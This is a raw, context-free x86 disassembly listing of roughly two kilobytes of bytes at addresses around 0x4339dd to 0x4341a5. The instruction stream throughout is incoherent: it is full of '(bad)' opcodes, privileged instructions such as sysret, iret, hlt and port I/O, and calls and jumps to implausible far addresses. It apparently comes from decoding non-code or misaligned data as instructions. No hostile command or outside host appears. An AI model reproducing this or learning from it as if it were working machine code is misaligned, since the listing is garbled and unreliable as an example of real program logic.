  4339dd:	lea    ebp,[eax-0x7c00fffe]
  4339e3:	xor    eax,DWORD PTR [eax]
  4339e5:	sysret 
  4339e7:	dec    ebp
  4339e8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  4339ef:	push   WORD PTR [ecx+0x8]
  4339f3:	jne    0x4339b6
  4339f5:	ud0    ecx,DWORD PTR [ecx]
  4339f8:	mov    edi,DWORD PTR [edx]
  4339fa:	lods   al,BYTE PTR ds:[esi]
  4339fb:	add    BYTE PTR [eax],al
  4339fd:	data16 (bad) 
  4339ff:	iret   
  433a00:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433a07:	cli    
  433a08:	inc    ebp
  433a09:	cmp    al,0x8d
  433a0b:	add    BYTE PTR [esi+0x2d],ah
  433a0e:	inc    ebp
  433a0f:	pop    ebp
  433a10:	lea    ecx,[edi]
  433a12:	mov    dl,bh
  433a14:	add    BYTE PTR [edi],cl
  433a16:	mov    DWORD PTR [eax+eax*8],edi
  433a19:	mov    ebx,0x3a87
  433a1e:	add    BYTE PTR [ebx],ch
  433a20:	inc    ebp
  433a21:	data16 (bad) 
  433a23:	clc    
  433a24:	int3   
  433a25:	cmp    eax,DWORD PTR [eax]
  433a27:	je     0x4339b2
  433a29:	push   0xffffffc8
  433a2b:	pop    edi
  433a2c:	xchg   DWORD PTR [ebp+0x0],eax
  433a2f:	data16 add BYTE PTR [ebp+0x45],cl
  433a33:	lea    cx,[ebp+0x10]
  433a37:	jb     0x433a39
  433a39:	jmp    0x4339c4
  433a3b:	call   eax
  433a3d:	clc    
  433a3e:	xchg   DWORD PTR [edi+0x1],edi
  433a41:	mov    eax,DWORD PTR [eax]
  433a43:	or     BYTE PTR [ebp-0x49],al
  433a46:	lea    eax,[eax+0x74003154]
  433a4c:	push   edi
  433a4d:	inc    edx
  433a4e:	jge    0x433a4f
  433a50:	mov    DWORD PTR [edi],ecx
  433a52:	fdiv   DWORD PTR [edi-0x6]
  433a55:	inc    DWORD PTR [eax]
  433a57:	xor    edx,DWORD PTR [eax+0x5f]
  433a5a:	xchg   DWORD PTR [ebx+0x1],ebx
  433a5d:	ret    0x0
  433a60:	xor    BYTE PTR [ebp-0x51],cl
  433a63:	cmp    edi,0xf0ff8902
  433a69:	data16 ror al,0x84
  433a6d:	rol    BYTE PTR [eax],0x3b
  433a70:	add    al,dh
  433a72:	dec    eax
  433a73:	xchg   esp,eax
  433a74:	push   ebx
  433a75:	jmp    0x433a02
  433a77:	push   ebp
  433a78:	add    esp,ebp
  433a7a:	add    ebp,esp
  433a7c:	mov    edx,DWORD PTR [edi+0x24]
  433a7f:	clc    
  433a80:	dec    esi
  433a81:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433a87:	cmp    BYTE PTR [ebx],al
  433a89:	jne    0x433a14
  433a8b:	xor    esp,eax
  433a8d:	jmp    0x463c10
  433a92:	add    ebp,DWORD PTR [ecx+ecx*4]
  433a95:	jne    0x433a8b
  433a97:	call   0xffcd37f1
  433a9c:	clc    
  433a9d:	xchg   edi,eax
  433a9e:	sti    
  433a9f:	add    DWORD PTR [ebx],eax
  433aa1:	add    BYTE PTR [ebp+0x47],bl
  433aa4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433aaa:	pop    ebp
  433aab:	mov    DWORD PTR [esi-0x48],esi
  433aae:	jmp    0x433af7
  433ab0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433ab6:	(bad)  
  433ab8:	cmp    al,0x0
  433aba:	cmp    eax,DWORD PTR [ebp+0x18]
  433abd:	lea    ebx,[ebp-0x56]
  433ac0:	jle    0x433ac2
  433ac2:	jae    0x433a4d
  433ac4:	mov    eax,esp
  433ac6:	call   0xb900:0x8b005587
  433acd:	inc    ebp
  433ace:	push   ebp
  433acf:	lea    ecx,[ebp-0x27ff4f12]
  433ad5:	mov    eax,edi
  433ad7:	int3   
  433ad8:	push   ebp
  433ad9:	xchg   edi,eax
  433adb:	add    esp,ebp
  433add:	add    BYTE PTR [eax],al
  433adf:	inc    ebp
  433ae0:	add    BYTE PTR [ebp+0x8b3255],cl
  433ae6:	cld    
  433ae7:	mov    DWORD PTR [edx],edi
  433ae9:	aam    0x75
  433aeb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433af1:	mov    DWORD PTR [ebx-0x50],edx
  433af4:	test   BYTE PTR [ebp-0x1],0xe8
  433af8:	mov    eax,DWORD PTR [eax]
  433afa:	hlt    
  433afb:	add    al,al
  433afd:	mov    eax,DWORD PTR ds:0x890045a8
  433b03:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433b09:	inc    DWORD PTR [eax*2+0xf75854d]
  433b10:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433b16:	call   0x72999857
  433b1b:	je     0x433b7b
  433b1d:	js     0x433b7e
  433b1f:	lock ret 0x7e
  433b23:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433b29:	mov    edi,edi
  433b2b:	sbb    al,bl
  433b2d:	clc    
  433b2e:	add    BYTE PTR [ebp-0x73],bh
  433b31:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433b37:	ror    BYTE PTR [eax],1
  433b39:	dec    ebp
  433b3a:	xchg   ebp,eax
  433b3b:	mov    edi,edi
  433b3d:	in     al,0x8b
  433b3f:	jge    0x433aca
  433b41:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433b47:	clc    
  433b48:	pop    esi
  433b49:	fist   DWORD PTR [ebp+0x5d398b5d]
  433b4f:	clc    
  433b50:	add    al,0x6e
  433b52:	mov    eax,DWORD PTR [ebx]
  433b54:	mov    BYTE PTR [ebp+0x0],dl
  433b57:	mov    edx,DWORD PTR [ebx-0x20]
  433b5a:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433b60:	add    eax,0x3b3a73
  433b65:	adc    al,0x89
  433b67:	pop    eax
  433b68:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433b6c:	ret    0xf08
  433b6f:	cmp    al,0x2
  433b71:	mov    DWORD PTR [edx],edi
  433b73:	cld    
  433b74:	add    BYTE PTR [ebp+0x66],dl
  433b77:	add    eax,ebx
  433b79:	add    esp,eax
  433b7b:	sub    eax,eax
  433b7d:	or     BYTE PTR [ecx-0x77f474bb],cl
  433b83:	add    BYTE PTR [eax],al
  433b85:	mov    DWORD PTR [ebx-0x24],ebx
  433b88:	push   edi
  433b89:	push   ebp
  433b8a:	clc    
  433b8b:	add    DWORD PTR [esi+0x1b0100],0x45
  433b92:	out    0xff,eax
  433b94:	add    edx,DWORD PTR [eax]
  433b96:	jmp    0x433b80
  433b98:	cmp    ch,0x44
  433b9b:	(bad)  
  433b9c:	jmp    0x40c8c3ee
  433ba1:	je     0x433b2d
  433ba3:	mov    eax,DWORD PTR [eax-0x10c78104]
  433ba9:	inc    ebp
  433baa:	add    BYTE PTR [ebx-0x770375],al
  433bb0:	add    ah,ch
  433bb2:	add    edx,esp
  433bb4:	pop    edi
  433bb5:	pop    ebp
  433bb6:	push   ebp
  433bb7:	inc    ebx
  433bb8:	in     al,dx
  433bb9:	pop    ebp
  433bba:	in     al,dx
  433bbb:	cmp    edx,DWORD PTR [edi-0x8]
  433bbe:	ss xchg esp,eax
  433bc0:	pushf  
  433bc1:	pop    ebx
  433bc2:	mov    ecx,ecx
  433bc4:	call   0x899882cd
  433bc9:	in     al,dx
  433bca:	in     al,0x45
  433bcc:	dec    ebp
  433bcd:	push   esi
  433bce:	test   DWORD PTR [eax+0xfb010f],esi
  433bd4:	add    BYTE PTR [eax+0xc018b],dh
  433bda:	leave  
  433bdb:	inc    ebp
  433bdc:	test   al,ch
  433bde:	add    dh,bh
  433be0:	add    bh,bh
  433be2:	dec    ebp
  433be3:	push   cs
  433be4:	mov    DWORD PTR [ecx],eax
  433be6:	hlt    
  433be7:	push   es
  433be8:	dec    ebp
  433be9:	leave  
  433bea:	mov    DWORD PTR [eax],ecx
  433bec:	clc    
  433bed:	cmovge eax,ecx
  433bf0:	mov    ecx,0x85c2f0
  433bf6:	clc    
  433bf7:	pop    DWORD PTR [ebp+0x1]
  433bfa:	push   ebx
  433bfb:	add    BYTE PTR [ebp-0x15],bh
  433bfe:	push   esi
  433bff:	xor    eax,0x898a45
  433c04:	cld    
  433c05:	inc    BYTE PTR [ebp+0x0]
  433c08:	cmp    BYTE PTR [esi-0x64],ah
  433c0b:	add    DWORD PTR [esi+0x78308c1],edi
  433c11:	add    ah,BYTE PTR [edi-0x49]
  433c14:	int    0xbb
  433c16:	mov    ecx,DWORD PTR [edi+0xc]
  433c19:	add    dh,al
  433c1b:	cmp    ecx,ebx
  433c1d:	jne    0x433be7
  433c1f:	xor    ecx,DWORD PTR [ebp+0x66]
  433c22:	jmp    0xca3c28
  433c27:	add    DWORD PTR [ebp+0x0],eax
  433c2a:	mov    eax,ebx
  433c2c:	or     al,0x8b
  433c2e:	(bad)  
  433c2f:	mov    ecx,esi
  433c31:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433c38:	mov    eax,edi
  433c3a:	or     BYTE PTR [edx],cl
  433c3c:	shl    cl,cl
  433c3e:	icebp  
  433c3f:	add    BYTE PTR [ebp+0x3a],0x8b
  433c43:	or     BYTE PTR [edx+eax*2],cl
  433c46:	(bad)  
  433c47:	or     cl,dh
  433c49:	stc    
  433c4a:	shl    DWORD PTR [ebp-0x30],0xc6
  433c4e:	xor    al,0x0
  433c50:	inc    ebp
  433c51:	xchg   BYTE PTR [ebx],al
  433c53:	add    esp,edi
  433c55:	add    BYTE PTR [ebp-0x39],cl
  433c58:	mov    al,bl
  433c5a:	test   DWORD PTR [ebx+0x1c348375],ecx
  433c60:	sub    al,0xbf
  433c62:	jmp    0x433be9
  433c64:	mov    edi,eax
  433c66:	lock jge 0x433c5a
  433c69:	lea    esi,[edx-0x74bad5fd]
  433c6f:	mov    ebp,esp
  433c71:	or     cl,dh
  433c73:	leave  
  433c74:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433c7b:	dec    ebp
  433c7c:	dec    ebp
  433c7d:	test   DWORD PTR [ebx],eax
  433c7f:	paddb  mm6,mm0
  433c82:	add    DWORD PTR [eax],eax
  433c84:	dec    ebp
  433c85:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433c8b:	mov    esi,DWORD PTR [edx]
  433c8d:	or     al,0x2b
  433c8f:	dec    ebp
  433c90:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433c96:	mov    esp,edx
  433c98:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433c9f:	mov    DWORD PTR [ebx],ebp
  433ca1:	call   0xc76c5d1
  433ca6:	mov    DWORD PTR [ebp+0x10],ecx
  433ca9:	(bad)  
  433caa:	push   0x8b85ff10
  433caf:	clc    
  433cb0:	or     al,0x51
  433cb2:	(bad)  
  433cb3:	push   ecx
  433cb4:	retf   
  433cb5:	mov    ebx,0xff4d8dc8
  433cba:	mov    DWORD PTR [ebp+0x8],eax
  433cbd:	xor    eax,DWORD PTR [ebp-0x75]
  433cc0:	cmp    ebp,DWORD PTR [ebx]
  433cc2:	lsl    ebx,WORD PTR [edi-0x8]
  433cc6:	call   DWORD PTR [ebx-0x741bff75]
  433ccc:	(bad)  
  433ccd:	or     al,0x5b
  433ccf:	dec    ebp
  433cd0:	or     BYTE PTR [ebx],dh
  433cd2:	inc    ebp
  433cd3:	xor    esi,DWORD PTR ds:0x708088d
  433cd9:	in     eax,0x99
  433cdb:	add    BYTE PTR [edx],dh
  433cdd:	inc    ebp
  433cde:	pop    edi
  433cdf:	xor    eax,edx
  433ce1:	test   DWORD PTR [eax],0x81108b8b
  433ce7:	dec    ebp
  433ce8:	sub    al,0x33
  433cea:	add    BYTE PTR [ebx],dh
  433cec:	push   esi
  433ced:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433cf3:	mov    edi,eax
  433cf5:	or     BYTE PTR [ebp+0x45],al
  433cf8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433cfe:	ss leave 
  433d00:	pushf  
  433d01:	push   es
  433d02:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433d0a:	inc    ebp
  433d0b:	cmp    BYTE PTR [esi],0x51
  433d0e:	pushf  
  433d0f:	addr16 (bad) 
  433d11:	shl    esp,1
  433d13:	dec    ebp
  433d14:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433d1a:	(bad)  
  433d1b:	jmp    0x8c0b0ff7
  433d20:	aam    0x8
  433d22:	test   DWORD PTR [ebp-0x8],ecx
  433d25:	mov    BYTE PTR [ebp-0x75],al
  433d28:	or     BYTE PTR [eax],cl
  433d2a:	add    BYTE PTR [ebp-0x75],dl
  433d2d:	mov    eax,0xfc728b
  433d32:	dec    ebp
  433d33:	enter  0xceba,0x8
  433d37:	retf   0x1807
  433d3a:	ret    0x994d
  433d3d:	mov    esi,DWORD PTR [edx]
  433d3f:	or     al,0x33
  433d41:	into   
  433d42:	add    edx,esi
  433d44:	add    ecx,edx
  433d46:	bswap  eax
  433d48:	ror    esi,0x98
  433d4b:	dec    ebp
  433d4c:	add    cl,ch
  433d4e:	mov    edi,edi
  433d50:	hlt    
  433d51:	inc    esi
  433d53:	inc    ebp
  433d54:	ret    0x4533
  433d57:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433d5d:	or     BYTE PTR [ebx],dh
  433d5f:	dec    ebp
  433d60:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433d66:	jne    0xff8d3d2d
  433d6c:	inc    ebp
  433d6d:	inc    ebp
  433d6e:	mov    esi,DWORD PTR [ebx]
  433d70:	clc    
  433d71:	pop    esi
  433d72:	ret    0xcaeb
  433d75:	mov    eax,esi
  433d77:	call   0x52048f4a
  433d7c:	dec    ebp
  433d7d:	add    eax,0xf8728b
  433d82:	adc    eax,0xce0ccac9
  433d87:	push   ebp
  433d88:	ret    0xc6ec
  433d8b:	in     al,dx
  433d8c:	call   0x33438a95
  433d91:	push   edi
  433d92:	add    edi,eax
  433d94:	xor    eax,eax
  433d96:	jmp    0x433ddd
  433d98:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433d9e:	add    eax,edi
  433da0:	shr    eax,cl
  433da2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433da8:	mov    edi,DWORD PTR [ecx]
  433daa:	in     al,dx
  433dab:	pushf  
  433dac:	ret    0x84c7
  433daf:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433db5:	inc    ebp
  433db6:	in     al,dx
  433db7:	ss inc ebp
  433db9:	pushf  
  433dba:	mov    eax,edi
  433dbc:	cld    
  433dbd:	fmul   st(2),st
  433dbf:	sbb    dl,al
  433dc1:	jmp    0x9c3b:0x374d45c1
  433dc8:	jbe    0x433d91
  433dca:	mov    esp,eax
  433dcc:	clc    
  433dcd:	add    BYTE PTR [ebp+0x0],cl
  433dd0:	mov    ecx,ecx
  433dd2:	lea    eax,[ebp-0x5]
  433dd5:	mov    edi,edi
  433dd7:	call   0x51ce8f21
  433ddc:	hlt    
  433ddd:	xor    eax,edx
  433ddf:	mov    esi,0x997284
  433de4:	xor    cl,dl
  433de6:	mov    esi,eax
  433de8:	hlt    
  433de9:	into   
  433dea:	inc    ebp
  433deb:	scas   eax,DWORD PTR es:[edi]
  433dec:	mov    ebp,ecx
  433dee:	cld    
  433def:	add    dl,cl
  433df1:	add    dl,al
  433df3:	inc    ebp
  433df4:	shr    DWORD PTR [ebx],0x4d
  433df7:	xor    edi,DWORD PTR [ebx]
  433df9:	mov    DWORD PTR [edi],ecx
  433dfb:	clc    
  433dfc:	dec    esi
  433dfd:	inc    ebp
  433dfe:	dec    DWORD PTR [ebx-0x3d2b1775]
  433e04:	ret    0xc6ca
  433e07:	mov    BYTE PTR [ebp-0x32],0x53
  433e0b:	scas   eax,DWORD PTR es:[edi]
  433e0c:	inc    ebp
  433e0d:	jmp    0x433e46
  433e0f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433e16:	pop    ebx
  433e17:	xor    ecx,DWORD PTR [ebp+0x3]
  433e1a:	mov    eax,DWORD PTR [ebx]
  433e1c:	clc    
  433e1d:	test   edx,ecx
  433e1f:	mov    ecx,esi
  433e21:	cld    
  433e22:	call   0x8ab7836c
  433e27:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433e2d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433e33:	fdiv   QWORD PTR [ebx]
  433e35:	retf   0xce89
  433e38:	in     al,0xc1
  433e3a:	inc    ebp
  433e3b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433e41:	into   
  433e42:	mov    dh,0xc1
  433e45:	call   0x8c1783ce
  433e4a:	(bad)  
  433e4b:	cld    
  433e4c:	mov    ecx,DWORD PTR [ebp-0x14]
  433e4f:	xor    eax,ecx
  433e51:	lea    eax,[ebp+0x8]
  433e54:	mov    esi,DWORD PTR [edx-0x4]
  433e57:	add    dl,al
  433e59:	inc    ebp
  433e5a:	mov    esp,0x32d8998b
  433e5f:	dec    ebp
  433e60:	mov    esi,DWORD PTR [ebx]
  433e62:	cld    
  433e63:	xor    eax,edx
  433e65:	sub    esp,DWORD PTR [edi-0x75]
  433e68:	int    0xec
  433e6a:	sub    ecx,eax
  433e6c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433e72:	mov    esi,esp
  433e74:	call   0x34178bfd
  433e79:	inc    DWORD PTR [ebx]
  433e7b:	mov    edi,DWORD PTR [ebx]
  433e7d:	cld    
  433e7e:	jne    0x433ecd
  433e80:	mov    esi,DWORD PTR [ebx]
  433e82:	aam    0x8d
  433e84:	dec    ebp
  433e85:	or     BYTE PTR [ebx],dh
  433e87:	jb     0x433e8c
  433e89:	add    BYTE PTR [edi+0x45],bl
  433e8c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433e93:	xor    ebp,esp
  433e95:	xor    eax,edi
  433e97:	sub    edi,esp
  433e99:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433e9f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433ea6:	inc    ebp
  433ea7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433ead:	clc    
  433eae:	mov    eax,edi
  433eb0:	nop
  433eb1:	fadd   QWORD PTR [eax]
  433eb3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433eb9:	jmp    0x433e44
  433ebb:	mov    eax,DWORD PTR [ecx]
  433ebd:	fadd   DWORD PTR [eax]
  433ebf:	inc    ebp
  433ec0:	or     DWORD PTR [ebx],esi
  433ec2:	dec    eax
  433ec3:	add    edx,DWORD PTR [ebx-0x2d]
  433ec6:	dec    ebp
  433ec7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433ecd:	inc    ebp
  433ece:	push   ecx
  433ecf:	mov    dl,BYTE PTR [ecx-0xd]
  433ed2:	xor    ecx,DWORD PTR [ebp-0x45]
  433ed5:	(bad)  
  433ed7:	rol    BYTE PTR [eax],0xc1
  433eda:	ret    
  433edb:	inc    ebp
  433edc:	inc    ebp
  433edd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433ee3:	xor    eax,ebx
  433ee5:	add    eax,DWORD PTR [ebp+0x23]
  433ee8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433eee:	cmp    edi,0xc
  433ef1:	dec    ebp
  433ef2:	inc    ebp
  433ef3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433ef9:	inc    ebp
  433efa:	mov    esi,DWORD PTR [ebx]
  433efc:	clc    
  433efd:	lea    eax,[ebp+0x45725407]
  433f03:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433f07:	xor    edi,DWORD PTR [eax]
  433f09:	mov    ecx,0xff8b8d4d
  433f0e:	push   esp
  433f0f:	enter  0x4df7,0x23
  433f13:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433f19:	mov    eax,DWORD PTR [ebx]
  433f1b:	loopne 0x433f08
  433f1d:	ret    0xc68b
  433f20:	push   esp
  433f21:	enter  0x9745,0x8b
  433f25:	inc    ebp
  433f26:	cld    
  433f27:	mov    eax,edi
  433f29:	clc    
  433f2a:	ret    
  433f2b:	ret    0xc645
  433f2e:	mov    esi,DWORD PTR [ebx]
  433f30:	cld    
  433f31:	pop    esi
  433f32:	mov    ebx,0x83458bc3
  433f38:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433f3c:	dec    ebp
  433f3d:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  433f45:	clc    
  433f46:	fcom   DWORD PTR [ebp+0x45]
  433f49:	mov    edi,DWORD PTR [eax]
  433f4b:	adc    al,0x9c
  433f4d:	inc    ebp
  433f4e:	(bad)  
  433f4f:	mov    ebx,eax
  433f51:	adc    al,0x85
  433f53:	cmp    al,0x1
  433f56:	inc    ebp
  433f57:	add    BYTE PTR [edx],bh
  433f59:	dec    ebp
  433f5a:	pushf  
  433f5b:	mov    ebp,ecx
  433f5d:	mov    eax,DWORD PTR [ebx]
  433f5f:	nop
  433f60:	add    BYTE PTR [eax],al
  433f62:	inc    ebp
  433f63:	mov    esi,DWORD PTR [ebx]
  433f65:	add    eax,DWORD PTR [ebx]
  433f67:	cmp    al,0x89
  433f69:	mov    esp,esi
  433f6b:	clc    
  433f6c:	inc    ebp
  433f6d:	inc    ebp
  433f6e:	add    edx,DWORD PTR [esi+0xc]
  433f71:	mov    edi,0x7ff0845
  433f76:	in     al,dx
  433f77:	(bad)  
  433f78:	jne    0x433f13
  433f7a:	mov    esi,DWORD PTR [edx]
  433f7c:	clc    
  433f7d:	add    ebp,DWORD PTR [esi]
  433f7f:	mov    edi,edi
  433f81:	in     al,dx
  433f82:	mov    DWORD PTR [ebp-0x10],eax
  433f85:	xor    eax,DWORD PTR [ebp+0x3]
  433f88:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  433f90:	(bad)  
  433f91:	push   eax
  433f92:	ret    
  433f93:	call   0xd4ffc925
  433f98:	call   0xffcf37e2
  433f9d:	cmp    BYTE PTR [ebp+0x4d],al
  433fa0:	test   DWORD PTR [eax+0x74],ecx
  433fa3:	inc    ecx
  433fa4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433faa:	ret    
  433fab:	inc    eax
  433fac:	dec    DWORD PTR [ebx+0x4945f8f0]
  433fb2:	push   eax
  433fb3:	dec    eax
  433fb4:	test   al,0xd0
  433fb6:	dec    eax
  433fb8:	mov    eax,DWORD PTR [ebp-0x14]
  433fbb:	mov    eax,DWORD PTR [ebp+0x38]
  433fbe:	mov    eax,ecx
  433fc0:	fadd   DWORD PTR [ebx]
  433fc2:	dec    ebp
  433fc3:	inc    eax
  433fc4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433fca:	inc    ebp
  433fcb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433fd1:	fadd   QWORD PTR [ebx]
  433fd3:	inc    ebp
  433fd4:	or     al,0x33
  433fd6:	dec    ebp
  433fd7:	add    edi,DWORD PTR [ebx]
  433fd9:	mov    DWORD PTR [edx-0x28],esi
  433fdc:	mov    eax,DWORD PTR [ebp-0x10]
  433fdf:	mov    eax,DWORD PTR [eax+0x10]
  433fe2:	mov    eax,edi
  433fe4:	lock ret 
  433fe6:	inc    ecx
  433fe7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433fed:	fsubr  st,st(5)
  433fef:	test   DWORD PTR [eax],eax
  433ff1:	clc    
  433ff2:	push   0x45
  433ff4:	(bad)  
  433ff5:	cmp    ebp,esp
  433ff7:	pushf  
  433ff8:	inc    ebp
  433ff9:	(bad)  
  433ffa:	push   eax
  433ffb:	fsub   DWORD PTR [eax-0x7b]
  433ffe:	(bad)  
  433fff:	clc    
  434000:	mov    eax,0xf8008584
  434005:	mov    eax,DWORD PTR [ebp-0x4]
  434008:	mov    edi,0x4585c3cc
  43400e:	clc    
  43400f:	mov    eax,DWORD PTR [ebp+0x14]
  434012:	cmp    BYTE PTR [ebp-0x64],al
  434015:	mov    edi,eax
  434017:	in     al,dx
  434018:	les    esi,FWORD PTR [ebp-0x7b]
  43401b:	mov    edi,eax
  43401d:	or     al,0x4d
  43401f:	dec    ebp
  434020:	mov    eax,ebp
  434022:	in     al,0xf2
  434024:	dec    ebp
  434025:	dec    DWORD PTR [ecx+0x4dc7e045]
  43402b:	fmul   DWORD PTR [ecx+0x4df8f085]
  434031:	inc    ebp
  434032:	mov    DWORD PTR [ebx],esi
  434034:	fadd   QWORD PTR [ebx]
  434036:	dec    ebp
  434037:	push   eax
  434038:	xor    eax,DWORD PTR [ebp+0x3]
  43403b:	push   eax
  43403c:	mov    DWORD PTR [eax+ebx*8],ebx
  43403f:	push   esi
  434041:	mov    eax,DWORD PTR [eax]
  434043:	lock cmp eax,0xf84e85c0
  434049:	inc    ebp
  43404a:	test   BYTE PTR [ebx],dh
  43404c:	add    DWORD PTR [ebx],eax
  43404e:	add    BYTE PTR [eax+0x4d],dl
  434051:	jne    0x434086
  434053:	lea    ecx,[ebx-0x7617fc44]
  434059:	div    ah
  43405b:	inc    DWORD PTR [ebp+0x45]
  43405e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  434064:	jb     0x433ff1
  434066:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43406d:	mov    ecx,DWORD PTR [ebp-0x10]
  434070:	xor    ecx,DWORD PTR [ebp+0x3]
  434073:	mov    edi,DWORD PTR [ebx]
  434075:	adc    BYTE PTR [ebp+0x41],dh
  434078:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43407e:	ret    
  43407f:	push   ss
  434080:	push   0x45
  434082:	lea    ecx,[ebx+0x4de80cb0]
  434088:	sti    
  434089:	add    edi,edi
  43408b:	or     BYTE PTR [ebp+0x4d],al
  43408e:	mov    ebp,DWORD PTR [ebx]
  434090:	xor    ebp,ecx
  434092:	mov    al,BYTE PTR [edx]
  434094:	add    eax,0xc7200
  434099:	jne    0x4340e8
  43409b:	lea    esi,[ebx]
  43409d:	mov    al,0xf
  43409f:	call   0xf3764
  4340a4:	shl    DWORD PTR [esi],0x84
  4340a7:	pushf  
  4340a8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4340ae:	mov    edi,DWORD PTR [ecx]
  4340b0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4340b7:	test   DWORD PTR [eax],eax
  4340b9:	clc    
  4340ba:	dec    ebp
  4340bb:	inc    ebp
  4340bc:	xor    edi,DWORD PTR [ebx]
  4340be:	setl   al
  4340c1:	(bad)  
  4340c2:	retf   
  4340c3:	rol    cl,1
  4340c5:	dec    ebp
  4340c6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4340cc:	inc    ebp
  4340cd:	lea    ecx,[ebx-0x75b2cc38]
  4340d3:	lea    eax,ds:0x4d72c4
  4340d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4340dc:	xor    ecx,edi
  4340de:	bswap  ebx
  4340e0:	ror    BYTE PTR [ebp-0x35],0xe9
  4340e4:	rol    DWORD PTR [ecx],0x84
  4340e7:	add    BYTE PTR [ecx],al
  4340e9:	cmp    BYTE PTR [eax],al
  4340eb:	pushf  
  4340ec:	inc    ebp
  4340ed:	jnp    0x8a4374f0
  4340f3:	mov    eax,DWORD PTR ds:0xcf72e8
  4340f9:	lock dec ebp
  4340fb:	retf   
  4340fc:	xor    ecx,DWORD PTR [ebp+0xf]
  4340ff:	mov    eax,eax
  434101:	fmul   st,st(3)
  434103:	test   ecx,0x1998484
  434109:	xor    al,BYTE PTR [eax]
  43410b:	mov    DWORD PTR [ebp-0x28],eax
  43410e:	mov    eax,DWORD PTR [ebp+0x33]
  434111:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434117:	ret    
  434118:	add    al,cl
  43411a:	dec    ebp
  43411b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  434121:	add    ecx,DWORD PTR ds:0xc7250
  434127:	inc    ebp
  434128:	rcl    DWORD PTR [eax+0x4d],0x2b
  43412c:	mov    edi,edi
  43412e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  434134:	jb     0x4340fd
  434136:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  43413d:	mov    esi,DWORD PTR [ebx]
  43413f:	cld    
  434140:	mov    cl,bh
  434142:	or     eax,0x372b6
  434147:	cmp    ecx,eax
  434149:	jne    0x4341c6
  43414f:	mov    eax,DWORD PTR [ebp-0x20]
  434152:	mov    eax,DWORD PTR [eax]
  434154:	xor    eax,edi
  434156:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  43415d:	mov    ecx,DWORD PTR [ebp-0x4]
  434160:	mov    ecx,edi
  434162:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434168:	jb     0x434179
  43416a:	add    BYTE PTR [edi-0x3f],dl
  43416d:	add    BYTE PTR [ebp-0x75],cl
  434170:	mov    esi,eax
  434172:	xor    eax,DWORD PTR [eax]
  434174:	mov    al,bh
  434176:	or     eax,0x497284
  43417b:	xor    al,cl
  43417d:	mov    ecx,DWORD PTR [ebp-0x4]
  434180:	mov    ecx,edi
  434182:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434188:	jb     0x434199
  43418a:	add    BYTE PTR [edi],dh
  43418c:	enter  0x8500,0x8b
  434190:	add    ah,bl
  434192:	add    BYTE PTR [eax],al
  434194:	inc    ebp
  434195:	(bad)  
  434196:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43419d:	mov    esi,DWORD PTR [edx-0x4]
  4341a0:	add    bh,cl
  4341a2:	dec    ebp
  4341a3:	mov    dh,0x8b
  4341a5:	add    esi,DWORD PTR [ebx]
